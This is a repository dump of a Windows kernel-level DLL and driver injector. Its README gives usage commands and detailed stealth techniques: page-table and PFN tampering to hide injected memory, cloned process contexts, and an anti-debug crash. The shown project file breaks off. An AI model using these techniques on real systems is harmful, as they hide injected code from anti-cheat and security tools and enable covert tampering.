Project Path: arc_gmh5225_Page-Table-Injector_x0o0hvn8

Source Tree:

```txt
arc_gmh5225_Page-Table-Injector_x0o0hvn8
├── LICENSE
├── README.md
├── client
│   ├── client.vcxproj
│   ├── client.vcxproj.filters
│   ├── driver
│   │   ├── driver_manager.cpp
│   │   ├── driver_manager.hpp
│   │   └── driver_shell.h
│   ├── driver_mapper
│   │   ├── driver_mapper.cpp
│   │   ├── driver_mapper.hpp
│   │   ├── memory_manager.cpp
│   │   ├── memory_manager.hpp
│   │   ├── page_table_manager.cpp
│   │   ├── page_table_manager.hpp
│   │   ├── pe_parser.cpp
│   │   ├── pe_parser.hpp
│   │   ├── service_manager.cpp
│   │   ├── service_manager.hpp
│   │   ├── trace_cleaner.cpp
│   │   ├── trace_cleaner.hpp
│   │   ├── utils.cpp
│   │   └── utils.hpp
│   ├── entry.cpp
│   ├── inject
│   │   ├── dll_mapper.cpp
│   │   ├── dll_mapper.hpp
│   │   └── dll_shell.h
│   ├── lib
│   │   ├── cli.h
│   │   └── ia_32.h
│   ├── pdb
│   │   ├── md5.cpp
│   │   ├── md5.hpp
│   │   ├── pdb.cpp
│   │   └── pdb.hpp
│   └── utils
│       ├── logging.h
│       ├── window_manager.cpp
│       └── window_manager.hpp
├── driver
│   ├── def
│   │   ├── def.hpp
│   │   ├── globals.cpp
│   │   ├── globals.hpp
│   │   ├── ia32.hpp
│   │   └── request.hpp
│   ├── driver.vcxproj
│   ├── driver.vcxproj.filters
│   ├── entry.cpp
│   ├── hde
│   │   ├── LICENSE
│   │   ├── hde.h
│   │   ├── hde32.cpp
│   │   ├── hde32.h
│   │   ├── hde64.cpp
│   │   ├── hde64.h
│   │   ├── hde_stdint.h
│   │   ├── table32.h
│   │   └── table64.h
│   ├── init.hpp
│   ├── mem
│   │   ├── detection.cpp
│   │   ├── detection.hpp
│   │   ├── hyperspace.cpp
│   │   ├── hyperspace.hpp
│   │   ├── mem.cpp
│   │   ├── mem.hpp
│   │   ├── page_table.cpp
│   │   ├── page_table.hpp
│   │   ├── phys.cpp
│   │   ├── phys.hpp
│   │   ├── pt_hook.cpp
│   │   ├── pt_hook.hpp
│   │   ├── scan.hpp
│   │   ├── validation.cpp
│   │   └── validation.hpp
│   └── utils
│       ├── intrin.cpp
│       ├── intrin.hpp
│       ├── raii.hpp
│       ├── utils.cpp
│       └── utils.hpp
└── injector.sln

```

`LICENSE`:

```
MIT License

Copyright (c) [2025] [Isaam Siddique]

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

```

`README.md`:

```md
# Page Table Injector (PT-Injector)

## Overview

PT-Injector is an advanced driver and DLL injection tool that uses direct physical memory manipulation to inject code into target processes. By modifying the target process' page tables, it can bypass many common anti-cheat and anti-tampering mechanisms that monitor virtual memory operations via the VAD (Virtual Address Descriptor) tree.

Tested from **Windows 10 20H2 19042** to **Windows 11 24H2 26100.6584**

## Video Showcase

https://github.com/user-attachments/assets/1f3a2385-42e8-497b-a738-0909e9a77cf6

## Features
- **DLL Execution Methods**:
	- IAT Hook (`iat`) - Hook Import Address Table to execute DLL entry point (default)
	- Thread Creation (`thread`) - Create thread (RtlCreateUserThread) for DLL entry point execution
	- SetWindowsHookEx (`swhk`) - SetWindowsHookEx for DLL entry point execution
- **Driver Allocation Methods**:
    - System context allocation (`system`)
    - Map driver within ntoskrnl's .data section (`.data`)
    - Allocate at a non present PML4E address within current process context in kernel space (`current-process`) - PML4 index 256-511
- **Driver Memory Page Types**:
    - Normal Pages (`normal`) - 4KB
    - Large Pages (`large`) - 2MB
    - Huge Pages (`huge`) - 1GB (not yet supported)
- **DLL Allocation Methods**:
    - Hijack PTEs with PTE.PageFrameNumber = 0 within the main module's .text section (`inside-main`)
    - Allocate between legitimate modules (`between-modules`)
    - Allocate at a non present PML4E address in usermode space (`low-address`) - PML4 index 0-255
    - Allocate at a non present PML4E address in kernel space (`high-address`) - PML4 index 256-511
    - Hyperspace context allocation (`hyperspace`) - Creates isolated memory context with cloned address space of target process
- **DLL Memory Page Types**:
    - Normal Pages (`normal`) - 4KB
    - Large Pages (`large`) - 2MB
    - Huge Pages (`huge`) - 1GB
- **Advanced Memory Hiding Mechanisms**:
    - No hiding (`none`) - Standard memory allocation
    - PFN exists bit manipulation (`pfn_exists_bit`) - Returns STATUS_INVALID_ADDRESS if copied by MmCopyMemory
    - Physical memory removal (`mi_remove_physical_memory`) - Removes pages from OS physical memory ranges  
    - Parity error bit (`set_parity_error`) - Returns STATUS_HARDWARE_MEMORY_ERROR on memory copy (default)
    - Lock bit anti-debug (`set_lock_bit`) - Causes system crash if page is copied by MmCopyMemory
    - Hide translation (`hide_translation`) - Sets the PteAddress field within the MmPfnDatabase entry to 0, this causes MmGetVirtualForPhysical to translate the physical address to the wrong virtual address, 0 in this case
- **Experimental Mechanisms**:
    - No hiding (`none`) - No experimental operations
    - Manipulate MiSystemPartition (`manipulate_mi_system_partition`) - Results in Windows reporting the incorrect OS physical memory ranges
- **Support for Various Payloads**:
    - Load DLL from disk
    - Use embedded in-memory DLL (MessageBox by default)
- **Enhanced User Experience**:
    - Intuitive command-line interface with named arguments
    - Verbose logging mode for detailed operation insights
    - Dry-run mode for configuration preview
    - Comprehensive help with examples
    - Input validation and error handling

## Usage

```
pt-injector.exe <target> [OPTIONS]
```

### Basic Usage Examples

```cmd
# Inject embedded DLL into Notepad using default settings (IAT hook)
pt-injector.exe Notepad

# Inject custom DLL using IAT hook (default)
pt-injector.exe Notepad -d payload.dll

# Inject embedded DLL using thread execution
pt-injector.exe Notepad -e thread

# Inject embedded DLL using SetWindowsHookEx
pt-injector.exe Notepad -e swhk

# Inject custom DLL using thread execution
pt-injector.exe Notepad -d payload.dll -e thread

# Preview configuration without executing
pt-injector.exe Notepad --dry-run -v
```

### Advanced Configuration Examples

```cmd
# Thread execution with hyperspace allocation
pt-injector.exe Notepad -e thread --dll-alloc hyperspace

# SetWindowsHookEx execution with hyperspace allocation
pt-injector.exe Notepad -e swhk --dll-alloc hyperspace

# Driver current process allocation and stealthy DLL allocation with IAT
pt-injector.exe Notepad -d memory -e iat --driver-alloc current-process --driver-memory large --dll-alloc between-modules --dll-memory normal --hook-module user32.dll --hook-function GetMessageW --target-module notepad.exe

# Thread execution with custom allocation
pt-injector.exe Notepad -d memory -e thread --driver-alloc current-process --dll-alloc low-address --dll-memory normal

# System-level allocation with IAT
pt-injector.exe Notepad -d memory -e iat --driver-alloc system --dll-alloc inside-main --dll-memory normal --hook-module user32.dll --hook-function GetMessageW --target-module notepad.exe

# Driver and DLL large page allocation with thread execution
pt-injector.exe Notepad -d memory -e thread --driver-alloc current-process --driver-memory large --dll-alloc low-address --dll-memory large

# Advanced stealth with custom hide options (IAT)
pt-injector.exe Notepad -d memory -e iat --driver-hide set_parity_error --dll-hide set_parity_error --driver-memory large --dll-alloc between-modules

# Anti-debug configuration (WARNING: Will crash system if page is copied via MmCopyMemory)
pt-injector.exe Notepad -d memory --driver-hide set_lock_bit --dll-hide set_lock_bit

# Hyperspace with advanced hiding and thread execution
pt-injector Notepad -d memory -e thread --dll-alloc hyperspace --dll-hide set_parity_error
```

## Parameters

### Required Arguments
- **target**: Target window name (e.g., "Notepad", "Calculator")

### Optional Arguments

#### DLL Options

- **-d, --dll**: Path to DLL file or "memory" for embedded MessageBox DLL (default: memory)
- **-e, --execution**: DLL execution method (default: iat)
	- `iat`: Hook Import Address Table (default)
	- `thread`: Create remote thread (RtlCreateUserThread) for DLL entry point execution
	- `swhk`: SetWindowsHookEx for DLL entry point execution

#### Driver Options  

- **--driver-alloc**: Driver allocation strategy (default: system)
  - `system`: System context allocation (default)
  - `.data`: Inside ntoskrnl .data section  
  - `current-process`: Current process context
- **--driver-memory**: Driver memory page size (default: normal)
  - `normal`: 4KB pages (default)
  - `large`: 2MB pages
  - `huge`: 1GB pages (not supported yet)
- **--driver-hide**: Driver memory hiding mechanism (default: none)
  - `none`: No memory hiding (default)
  - `pfn_exists_bit`: Returns STATUS_INVALID_ADDRESS on memory copy
  - `mi_remove_physical_memory`: Removes pages from physical memory ranges
  - `set_parity_error`: Returns STATUS_HARDWARE_MEMORY_ERROR
  - `set_lock_bit`: Anti-debug mechanism - crashes system if page copied
  - `hide_translation`: MmGetVirtualForPhysical will return the incorrect virtual address that's mapped by the PTE, 0 in this case.

#### DLL Options

- **--dll-alloc**: DLL allocation strategy (default: low-address)
  - `inside-main`: Hijack PTEs in main module
  - `between-modules`: Allocate between legitimate modules
  - `low-address`: Usermode space (PML4 0-255) (default)
  - `high-address`: Kernel space (PML4 256-511)
  - `hyperspace`: Isolated memory context with cloned address space of target process
- **--dll-memory**: DLL memory page size (default: normal)
  - `normal`: 4KB pages (default)
  - `large`: 2MB pages
  - `huge`: 1GB pages (not supported yet)
- **--dll-hide**: DLL memory hiding mechanism (default: none)
  - `none`: No memory hiding (default)
  - `pfn_exists_bit`: Returns STATUS_INVALID_ADDRESS on memory copy
  - `mi_remove_physical_memory`: Removes pages from physical memory ranges
  - `set_parity_error`: Returns STATUS_HARDWARE_MEMORY_ERROR
  - `set_lock_bit`: Anti-debug mechanism - crashes system if page copied
  - `hide_translation`: MmGetVirtualForPhysical will return the incorrect virtual address that's mapped by the PTE, 0 in this case.

#### Hook Options (only used with --execution iat)
- **--hook-module**: Module to hook in the IAT (default: user32.dll)
- **--hook-function**: Function to hook in the IAT (default: GetMessageW)  
- **--target-module**: Module whose IAT to hook (empty = main module)

#### Experimental Options
- **--experimental**: Experimental operations to perform (default: none)
  - `none`: No experimental operations (default)
  - `manipulate_system_partition`: Modify MiSystemPartition to affect physical memory ranges (WARNING: May cause system instability)

#### Utility Options
- **-v, --verbose**: Enable detailed logging
- **--dry-run**: Show configuration without injecting

### Help and Examples

Use `pt-injector.exe --help` to see comprehensive usage information with examples.

**Note**: Use quotes around window names containing spaces (e.g., "Notepad")

## Technical Details

PT-Injector operates at a kernel level using direct page table manipulation instead of traditional memory APIs such as ZwAllocateVirtualMemory/NtAllocateVirtualMemory. This approach makes detection significantly more difficult as it bypasses common monitoring mechanisms that operate using the Virtual Address Descriptor (VAD) tree.

### Pure Physical Memory Access

A key distinguishing feature of this project is its exclusive use of physical memory operations:

- **No Process Context Switching**: Unlike traditional DLL injectors, PT-Injector never uses KeStackAttachProcess to attach to the target process context
- **Direct Physical Memory Manipulation**: All memory operations are performed through direct physical memory access
- **Page Table Modification**: Memory allocation is achieved by directly manipulating page tables at the physical level
- **Cross-Context Operation**: Can modify any process's memory without ever entering its execution context

This approach makes the injection practically invisible to security solutions that monitor for process context switches or virtual memory operations.

### Hyperspace Allocation Technique

The hyperspace allocation method represents one of the more advanced stealth techniques in PT-Injector:

#### What is Hyperspace?

Hyperspace is a technique (initially created by [IDontCode](https://git.back.engineering/IDontCode) ) that creates an isolated memory context invisible to the target process. When Windows schedules a thread, it loads the CR3 register with the value from `_KTHREAD->ApcState->Process->DirectoryTableBase`. By creating a cloned EPROCESS and DirectoryTableBase (CR3) of the target process via MmAllocateIndependentPages, we can switch specific threads to this isolated context without affecting the original process.

#### Key Windows Kernel Structures 

```cpp
struct _KAPC_STATE
{
    struct _LIST_ENTRY ApcListHead[2];             // 0x0
    struct _KPROCESS* Process;                     // 0x20 <- swap with new cloned _KPROCESS
    union
    {
        UCHAR InProgressFlags;                     // 0x28
        struct
        {
            UCHAR KernelApcInProgress:1;           // 0x28
            UCHAR SpecialApcInProgress:1;          // 0x28
        };
    };
};

struct _KTHREAD
{
    struct _DISPATCHER_HEADER Header;              // 0x0
    VOID* SListFaultAddress;                       // 0x18
    ULONGLONG QuantumTarget;                       // 0x20
    // ... etc ...
    struct _KAPC_STATE ApcState;                   // contains pointer to _KPROCESS
    // ... etc ...
};

struct _KPROCESS
{
    struct _DISPATCHER_HEADER Header;              // 0x0
    struct _LIST_ENTRY ProfileListHead;            // 0x18
    ULONGLONG DirectoryTableBase;                  // 0x28 <- swap CR3 with our new cloned one
    struct _LIST_ENTRY ThreadListHead;             // 0x30
    ULONG ProcessLock;                             // 0x38
    // ... etc ...
};
```


**How Hyperspace Works:**

1. **EPROCESS/KPROCESS Cloning**: Creates a complete clone of the target process's EPROCESS/KPROCESS structure
2. **DirectoryTableBase Cloning**: Allocates a new PML4 that is a copy of the original process, swaps the cloned KPROCESS's DirectoryTableBase with the new one.
3. **Contextualized Copy of Ntoskrnl**: Creates an isolated copy of ntoskrnl.exe within the hyperspace context's PML4 high address, allows for hooking kernel functions within the hyperspace context without triggering PatchGuard. These hooks are not visible globally, only within the hyperspace context.
4. **Thread Context Switching**: Modifies specific threads to use the hyperspace context by swapping `_KTHREAD.ApcState.Process` to use our cloned KPROCESS. Please note this specific part is very easy to detect and you should look into hiding the thread.
5. **Isolated Execution**: Code executes in a completely separate memory context invisible to the original process

<img width="1920" height="969" alt="image" src="https://github.com/user-attachments/assets/a38802a5-01ef-491b-9b58-195d2c511dce" />

**Key Advantages:**

- **Complete Isolation**: Modifications are only visible within the hyperspace context
- **Inline Kernel Hooks**: Inline kernel hooks (like PspExitThread) only affects the hyperspace copy and are not visible globally.
- **Per-Thread Control**: Only selected threads see the hyperspace mappings

**Technical Implementation:**

- Creates a deep copy of ntoskrnl at the same virtual address
- Handles self-referencing PML4 entries correctly
- Initializes critical EPROCESS structures to prevent BSODs when creating a thread within the hyperspace context
- Hooks PspExitThread within the hyperspace context and restores `_KTHREAD.ApcState.Process` to the original to prevent a bug check call when the thread exits.
- Implements automatic memory cleanup on process termination by registering a process exit callback (PsSetCreateProcessNotifyRoutineEx) within a legit module of an already loaded Windows kernel driver.

**Note**:

- If your goal is to hook present and render a menu, please note you will have to give the target process's render thread access to the hyperspace context via hyperspace::switch_thread_context_to_hyperspace within the driver project.
- For simplicity's sake I'm using RtlCreateUserThread or SetWindowsHookEx for the hyperspace DLL entry point execution.
- In my opinion, this method is more ideal for an external window with internal memory access. At this moment there's quite a lot of detection vectors, but with some modifications (such as hiding threads, spoofing return addresses, not triggering thread notify routines on thread creation/deletion and ideally not using traditional process notify routines for cleanup) it can be extremely good.
- I've only tested this on Notepad and not anything else, if you run into bugs or issues please submit a pull request.
- **Hyperspace allocation was designed with thread execution in mind** - while IAT hooking is supported, thread execution is recommended for optimal compatibility.

### Signature Scan Protection Mechanism

The tool employs sophisticated protection mechanisms by manipulating the Physical Frame Number (PFN) database entries with multiple hiding options:

**Available Hide Types:**

- **None (`none`)**: Standard memory allocation without hiding
- **PFN Exists Bit (`pfn_exists_bit`)**: Sets the MMPFN.u4.PfnExists bit to 0, causing MmCopyMemory to return STATUS_INVALID_ADDRESS (0xC0000141)
- **Physical Memory Removal (`mi_remove_physical_memory`)**: Removes pages from OS physical memory ranges and clears PFN entries, also returning STATUS_INVALID_ADDRESS
- **Parity Error (`set_parity_error`)**: Sets MMPFN.e3.ParityError flag to 1, causing MmCopyMemory to return STATUS_HARDWARE_MEMORY_ERROR (0xC0000709) - Default option
- **Lock Bit Anti-Debug (`set_lock_bit`)**: Sets MMPFN.u2.LockBit to 1. It's an anti-debug mechanism that causes the CPU to yield followed by a system crash if an attempt is made to copy the page via MmCopyMemory.
- **Hide Translation (`hide_translation`)**: Sets MMPFN.PteAddress to 0. This causes MmGetVirtualForPhysical to return 0 for the virtual address that's mapped by the PTE. Ideally you should spoof the PteAddress field to another pfn's PteAddress field to make it look more legitimate.

### Driver Allocation Techniques

The tool uses three main techniques for the driver memory allocation:

1. **In System Context**: Utilizes the system's kernel paging tables for allocation (MmAllocateIndependentPages).
2. **Inside Ntoskrnl .data Section:** Finds and repurposes unused memory within ntoskrnl's .data section.
3. **At Non Present PML4E Within Current Process Context**: Allocates memory at a non present PML4E address in kernel space (PML4 index 256-511), but keeps it within the current process' context.

### DLL Allocation Techniques

The tool uses three main techniques for the DLL memory allocation:

1. **Between Legitimate Modules**: Finds gaps between existing DLLs and allocates memory in these spaces.
2. **Inside Main Module**: Finds and repurposes unused memory within the main module range (hijacking null PFNs within the main module range).
3. **At Non Present PML4E (Low)**: Allocates memory at a non present PML4E address in usermode space (PML4 index 0-255)
4. **At Non Present PML4E (High)**: Allocates memory at a non present PML4E address in kernel space (PML4 index 256-511)
5. **Hyperspace**: Creates an isolated memory context with a cloned address space of the target process, only specific threads have access to this context, thus providing the highest level of stealth when it comes specifically to memory inspection.

### Experimental Options

The tool has one experimental feature option for hiding memory:

1. **Manipulate MiSystemPartition**: This technique results in Windows reporting the incorrect physical memory ranges, screenshots of RamMap and DebugView are shown below:


<div align="left">  
<b>BEFORE Manipulating MiSystemPartition:</b>  
</div>
<p align="left">

  <img src="https://github.com/user-attachments/assets/c08f5f2a-2ace-47f9-b12a-54ebddb5a37c">
</p>
<div align="left">  
<b>AFTER Manipulating MiSystemPartition:</b>   
</div>
<p align="left">
  <img src="https://github.com/user-attachments/assets/118209cb-420f-4876-99a1-13dcf07e3179">
</p>
<p align="left">
  <img src="https://github.com/user-attachments/assets/3de87137-e571-481b-9fcf-cf169bf72bcf">
</p>

## Security Notes

This tool is designed for educational and research purposes only. It demonstrates advanced memory manipulation techniques that operate at the kernel level. Use responsibly and only on systems you own or have explicit permission to test. This is an older project of mine which I've decided to release, it is likely detected on most anti-cheat solutions by now. This project has not been tested on my bare metal system, please run it on a virtual machine. This project is also **NOT** Control Flow Guard (CFG) compliant. Please disable CFG under Exploit Protection settings if your target application is compiled with CFG, else the target application will crash on injection.

## Detection Test Cases

I've implemented a proof of concept full page table walk detection for this project which can be found in mem/detection.hpp inside the kernel driver project. The test case can be ran by calling detections::inspect_process_page_tables with the target process id as the argument. Below is an example detection report of a low address allocation where each physical page has MMPFN.e3.ParityError set to 1. Another detection method is walking through MmPfnDatabase and checking for MMPFN.e3.ParityError set to 1, but I have not yet implemented this. 

![detection_test_cases](https://github.com/user-attachments/assets/0fde3456-84d4-40d6-93b0-2940e0793b65)

## Building from Source

The project requires:

- Visual Studio 2019 or newer
- Windows SDK 10
- Windows Driver Kit (WDK), matching version with Windows SDK
- C++20 or later
- **Optional**: LLVM/Clang for alternative compilation

### Compiler Support

The project supports both MSVC and Clang compilation:

- **MSVC**: Default compiler, fully tested and supported
- **Clang**: Alternative compiler option

### Build Instructions

1. Clone the repository
2. Open the solution in Visual Studio
3. Ensure the SDK and WDK are properly installed and configured within the project settings
4. **Choose your compiler**:
    - **For MSVC**: Use default Visual Studio toolchain
    - **For Clang**:
        - Install LLVM/Clang
        - Set Platform Toolset to "LLVM (clang-cl)" in project properties
        - Or configure custom build with Clang directly
5. Build in Release mode for x64 architecture

### Clang-Specific Notes

- The project automatically detects the compiler and uses appropriate intrinsics/inline assembly
- WDK paths are dynamically resolved to support different installation versions
- Both kernel driver and user mode components support Clang compilation

### Build Configurations

- **Release x64** (Recommended for production)
- **Debug x64** (For development and debugging)
- Compatible with both MSVC and Clang toolchains

## Credits

 - CLI parsing library: https://github.com/CLIUtils/CLI11
 - Physical memory read/write: https://github.com/SamuelTulach/DirectPageManipulation
 - Manual map idea inspired from: https://github.com/KANKOSHEV/face-injector-v2
 - Process-context specific kernel driver mapper idea taken from: https://git.back.engineering/IDontCode/PSKDM
 - Hyperspace idea taken from: https://git.back.engineering/IDontCode/hyperspace
 - Kernel driver manual mapper: https://github.com/TheCruZ/kdmapper
 - PDB symbol parsing: https://github.com/i1tao/EzPDB
 - Windows kernel structures: https://www.vergiliusproject.com/kernels/x64

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for full details.

### Important Notice

This software is provided for **EDUCATIONAL AND RESEARCH PURPOSES ONLY**. 

By using this software, you acknowledge that:
- You will only use this software for educational, research, and non-commercial purposes
- You will not use this software for any malicious purposes including unauthorized access to computer systems
- You understand the potential legal implications of misusing the techniques demonstrated
- You accept all responsibility for how you choose to use this software

The creators and contributors of this project cannot be held responsible for any misuse of this software or the techniques it demonstrates.

## Contributing

Contributions are welcome! Please feel free to submit a Pull Request.
```

`client/client.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="driver\driver_manager.cpp" />
    <ClCompile Include="driver_mapper\driver_mapper.cpp" />
    <ClCompile Include="driver_mapper\memory_manager.cpp" />
    <ClCompile Include="driver_mapper\page_table_manager.cpp" />
    <ClCompile Include="driver_mapper\pe_parser.cpp" />
    <ClCompile Include="driver_mapper\service_manager.cpp" />
    <ClCompile Include="driver_mapper\trace_cleaner.cpp" />
    <ClCompile Include="driver_mapper\utils.cpp" />
    <ClCompile Include="entry.cpp" />
    <ClCompile Include="inject\dll_mapper.cpp" />
    <ClCompile Include="pdb\pdb.cpp" />
    <ClCompile Include="pdb\pdb.hpp" />
    <ClCompile Include="pdb\md5.cpp" />
    <ClCompile Include="utils\window_manager.cpp" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="lib\cli.h" />
    <ClInclude Include="driver\driver_manager.hpp" />
    <ClInclude Include="driver\driver_shell.h" />
    <ClInclude Include="driver_mapper\driver_mapper.hpp" />
    <ClInclude Include="driver_mapper\page_table_manager.hpp" />
    <ClInclude Include="driver_mapper\pe_parser.hpp" />
    <ClInclude Include="driver_mapper\service_manager.hpp" />
    <ClInclude Include="driver_mapper\trace_cleaner.hpp" />
    <ClInclude Include="driver_mapper\utils.hpp" />
    <ClInclude Include="inject\dll_shell.h" />
    <ClInclude Include="inject\dll_mapper.hpp" />
    <ClInclude Include="lib\ia_32.h" />
    <ClInclude Include="driver_mapper\memory_manager.hpp" />
    <ClInclude Include="pdb\md5.hpp" />
    <ClInclude Include="utils\logging.h" />
    <ClInclude Include="utils\window_manager.hpp" />
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>16.0</VCProjectVersion>
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{c39d3318-ea1d-4d09-bd0f-6ff09cdffda0}</ProjectGuid>
    <RootNamespace>client</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
    <ProjectName>client</ProjectName>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>ClangCL</PlatformToolset>
    <WholeProgramOptimization>false</WholeProgramOptimization>
    <CharacterSet>MultiByte</CharacterSet>
    <SpectreMitigation>false</SpectreMitigation>
    <VCToolsVersion>
    </VCToolsVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LinkIncremental>true</LinkIncremental>
    <OutDir>$(SolutionDir)bin\</OutDir>
    <IntDir>$(SolutionDir)bin\intermediates\</IntDir>
    <TargetName>$(ProjectName)_x64</TargetName>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
    <OutDir>$(SolutionDir)bin\</OutDir>
    <IntDir>$(SolutionDir)bin\intermediates\</IntDir>
    <TargetName>pt-injector</TargetName>
    <LibraryPath>$(VSInstallDir)DIA SDK\lib\amd64;$(VC_LibraryPath_x64);$(WindowsSDK_LibraryPath_x64)</LibraryPath>
    <GenerateManifest>true</GenerateManifest>
    <IncludePath>$(VSInstallDir)DIA SDK\include;$(IncludePath)</IncludePath>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;_CRT_SECURE_NO_WARNINGS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <LanguageStandard>stdcpp20</LanguageStandard>
      <LanguageStandard_C>stdc17</LanguageStandard_C>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <UACExecutionLevel>RequireAdministrator</UACExecutionLevel>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>TurnOffAllWarnings</WarningLevel>
